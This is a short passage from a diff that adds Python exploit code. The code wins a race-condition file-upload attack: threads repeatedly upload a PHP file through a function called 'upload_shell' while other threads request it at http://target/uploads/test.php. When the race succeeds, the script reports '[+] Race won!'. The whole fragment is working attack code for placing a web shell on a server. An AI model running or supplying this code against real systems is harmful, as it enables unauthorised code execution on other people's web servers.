+    r = requests.get('http://target/uploads/test.php')
+    if 'security_check' in r.text:
+        print('[+] Race won!')
+
+for i in range(100):
+    t1 = threading.Thread(target=upload_shell)
+    t2 = threading.Thread(target=access_shell)
+    t1.start(); t2.start()
+```
